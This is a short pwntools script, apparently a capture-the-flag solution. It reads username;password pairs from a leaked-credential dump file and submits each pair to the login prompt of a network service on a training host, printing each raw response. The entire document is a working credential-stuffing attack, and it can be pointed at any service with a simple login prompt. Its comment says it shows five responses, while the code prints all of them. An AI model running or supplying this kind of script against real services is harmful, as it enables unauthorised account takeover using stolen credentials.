#!/usr/bin/env python3
from pwn import *

HOST, PORT = "chatelaine.cylabacademy.net", 12082
CREDS_FILE = "creds-dump.txt"

context.log_level = "error"

def attempt(user, pw):
    try:
        r = remote(HOST, PORT, timeout=5)
        r.recvuntil(b"Username:", timeout=5)
        r.sendline(user.encode())
        r.recvuntil(b"Password:", timeout=5)
        r.sendline(pw.encode())
        out = r.recvall(timeout=5)
        r.close()
        return out
    except Exception as e:
        return b"<<ERR:%s>>" % str(e).encode()

# show the first 5 raw responses so you can SEE what success/failure looks like
shown = 0
with open(CREDS_FILE, "r", errors="ignore") as f:
    for line in f:
        line = line.strip()
        if not line or ";" not in line:
            continue
        user, pw = [p.strip() for p in line.split(";", 1)]
        if not user or not pw:
            continue
        out = attempt(user, pw)
        if shown < 9999:
            print(f"--- {user!r} / {pw!r} ---")
            print(repr(out))
            shown += 1
